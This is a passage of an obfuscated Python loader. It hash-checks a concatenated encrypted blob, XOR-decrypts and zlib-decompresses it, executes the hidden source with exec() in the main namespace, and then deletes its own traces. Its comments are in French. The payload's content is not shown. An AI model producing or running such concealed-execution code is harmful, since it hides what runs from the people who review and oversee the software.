_ccCMQFSIiaAfeI + _coqHBdGER92Myb + _cuPIPWWmyrnWs0 + _cteU_aTf70LhCa + _cvhvg808oUVw1d + _cyA7nEcpjylgIY + _cssBDtFxEaiXEj + _csquNxNhICZe2n + _cpehkowXtamraC + _cqQbxRXqe4cDbV + _cpv5AqaTUj3JmY + _cn_EYsP1bGnbFN + _ceLY_qVNqIWqIi + _clU4K6mwEpFAQ6 + _cxRYEIwvpNfxz6 + _cw00ChrraoF_dj + _ctt54XIVCCFjEZ + _ciBebWYpRxygBy + _cyco0EFBfBXVCD + _cobeEUeI09iD59 + _cgDAchnhHXPKJk + _cw9HYfBuZItrzP + _cvepKGDSJKj55h + _ceY8dptWhcODTq + _cjrOBGWbKcJNKz + _cybumvvmCo74hH + _cfYMrwlsYqDeSv + _c_YXfMFBlLgo1L + _cefoQjho9c22vg + _cqzH0JQK9kLa7I + _cbTz0NpH8nHkNm + _c_Z5b5VUouw_DM + _cfn63ARtRM1ndT + _cf1xWfLYjxlOxV + _clmqp3Edun_3Mf + _cclpMaulYCzJfM + _cpgVZjBVISZKqL + _czrt2ObLsOXjlS + _chrINDTuTel8R1 + _cjm9Pk1iz8T7Wp + _csebXe9J0GBoqt + _cdkD3aGMHRoIUY + _cg2lSWlAOLb8Ep + _cm3XMFK46aabsA + _cjFnR6ikf2c5QL + _clnojmkD6jYKo8 + _cjFTUZXghqLQpB + _cjPjAEF0ZjwCTW + _ckLwMQBeWUhHJp + _cgZGZdYv7hjkPK + _cuIdjROEkasMgs + _ciNEZ5wGB3Thir + _ce9qjDiRADKvuB + _czDb0YWxnPHv6o + _crtHMtepCIb8QI + _cws0TTFEI1Yude)
if __import__('hashlib').sha256(_pm00IEBUJ_JRYU).hexdigest() != '83ab599f5f18025238a618b0882dce06aa3f206aecc05040d49246441959ef81':
    __import__('sys').exit(1)
_xcIsHNwv82TmAa = bytes([91, 23, 7, 255, 200, 3, 114, 71, 66, 31, 240, 150, 212, 206, 237, 121, 128])
_fkvWa8REImMzLBB = bytes([19, 110, 231, 229, 136, 2, 150, 120, 191, 239, 72, 64, 57, 183, 86, 175, 10])

def _fxqTJzKpNjgVWsV(_bcUbwtWEPBykYm, _kzYU9w2rVPpDVG):
    return bytes(_bcUbwtWEPBykYm[_ihDgy8HzHzsOYG] ^ _kzYU9w2rVPpDVG[_ihDgy8HzHzsOYG % len(_kzYU9w2rVPpDVG)] for _ihDgy8HzHzsOYG in range(len(_bcUbwtWEPBykYm)))

def _fdjjnvUD7YAdr_L(_tljBkjLVOBXm47):
    import zlib
    return zlib.decompress(_tljBkjLVOBXm47) # Un seul niveau de zlib ici pour simplifier

def _fel8_19mu1hnFzG():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xphcQdSHLqSQ8j = _fxqTJzKpNjgVWsV(_pm00IEBUJ_JRYU, _xcIsHNwv82TmAa)
    # 2. Décompression Zlib
    _dzgbYfnfaHmjvS = _fdjjnvUD7YAdr_L(_xphcQdSHLqSQ8j)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dzgbYfnfaHmjvS.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nkxyM6kHnZa7GN = _main.__dict__
    _nkxyM6kHnZa7GN.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nkxyM6kHnZa7GN)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fel8_19mu1hnFzG()
try:
    del _fxqTJzKpNjgVWsV, _fdjjnvUD7YAdr_L, _fel8_19mu1hnFzG
    del _pm00IEBUJ_JRYU, _xcIsHNwv82TmAa, _fkvWa8REImMzLBB
except:
    pass
